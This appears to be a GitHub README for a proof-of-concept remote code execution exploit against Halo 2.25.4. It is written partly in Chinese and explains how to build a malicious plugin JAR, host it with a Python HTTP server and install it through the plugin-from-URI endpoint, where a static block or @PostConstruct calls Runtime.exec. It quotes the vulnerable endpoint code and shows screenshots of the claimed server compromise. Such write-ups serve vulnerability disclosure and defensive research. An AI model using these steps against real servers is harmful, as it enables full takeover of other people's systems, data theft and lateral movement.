# halo-2.25.4-exp

Deploy Halo 2.25.4 using Docker or Docker Compose

Hosting with a simple Python HTTP server

python3 -m http.server 9999

JAR access address: http://<your IP>:9999/poc-plugin.jar

Build a malicious plugin JAR：

cd halo-rce-poc

chmod +x build-plugin.sh

./build-plugin.sh

#### 漏洞描述

`PluginEndpoint` Provides an endpoint to install/upgrade plugins from a URI. After receiving the URI provided by the user, through `ReactiveUrlDataBufferFetcher` Download the JAR file and save it to a temporary file, then load it as a plugin using the PF4J framework. After PF4J loads it, Spring's `DefaultPluginApplicationContextFactory` Automatic instantiation `plugin.yaml` All the extended classes declared in the middle are Spring Bean。

#### 攻击链

1. `PluginEndpoint.installFromUri()` Receive user URI (**no whitelist check**)
2. `DefaultReactiveUrlDataBufferFetcher.fetch(uri)` Download JAR
3. Write to a temporary file → `pluginService.install(path)`
4. PF4J  `JarPluginLoader` Load JAR → `DefaultPluginApplicationContextFactory` Automatic registration of extension class
5. Malicious class `static {}` block or `@PostConstruct` → `Runtime.exec()` → The server got taken over

#### Key code

```java
// PluginEndpoint.java:422-428
var content = request.bodyToMono(InstallFromUriRequest.class)
    .map(InstallFromUriRequest::uri)
    .flatMapMany(reactiveUrlDataBufferFetcher::fetch);  // ← 从任意URI下载
return Mono.usingWhen(writeToTempFile(content), pluginService::install, this::deleteFileIfExists);
```

#### Impact Scope

- An attacker with plugin management permissions can directly gain remote control of the server
- Complete system compromise, data theft, lateral movement

导入插件：http://192.168.49.128:8090/console/plugins

<img width="692" height="506" alt="image" src="https://github.com/user-attachments/assets/4282b8bb-a110-4708-bcca-13c0279abe2b" />

Returns 200, the plugin is installed

<img width="1874" height="730" alt="image" src="https://github.com/user-attachments/assets/8a1026e3-0d4c-4cb6-9573-8721dc170afe" />
<img width="692" height="545" alt="image" src="https://github.com/user-attachments/assets/fb4fb9cf-f3e1-4eb3-9c61-0e0e7f3d5772" />

The logs show that the RCE was successfully triggered

<img width="692" height="96" alt="image" src="https://github.com/user-attachments/assets/45fa62ac-1301-4215-82cb-048e48ca72bf" />

Successfully saved to the server locally at /tmp/halo-poc-pwned.txt

<img width="692" height="96" alt="image" src="https://github.com/user-attachments/assets/24c120ed-78dc-454b-bb81-f2e56dde40ea" />

